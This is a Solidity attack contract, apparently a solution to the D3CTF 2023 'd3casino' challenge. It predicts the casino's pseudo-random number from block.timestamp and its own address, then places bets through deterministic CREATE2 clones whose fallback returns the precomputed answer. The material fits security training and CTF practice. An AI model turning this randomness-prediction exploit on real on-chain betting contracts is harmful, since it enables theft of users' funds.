// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/proxy/Clones.sol";
import "src/D3CTF_2023/d3casino/D3Casino.sol";

contract D3CasinoAttack {
    uint256 public value;
    address public proxyAddress;

    function predict(bytes32 salt) public view returns(address predictedAddress) {
        predictedAddress = Clones.predictDeterministicAddress(address(this), salt);
    }

    function clone(bytes32 salt) public {
        proxyAddress = Clones.cloneDeterministic(address(this), salt);
    }

    function bet(address target) public {
        uint256 rand = uint256(
        keccak256(
                abi.encodePacked(block.timestamp, /*block.difficulty,*/ this)
            )
        ) % 17;
        value = rand;
        D3Casino casino = D3Casino(target);
        casino.bet();

    }

    fallback(bytes calldata /*data*/) external returns(bytes memory retVal) {
        return abi.encode(value);  // low gas
    }
}
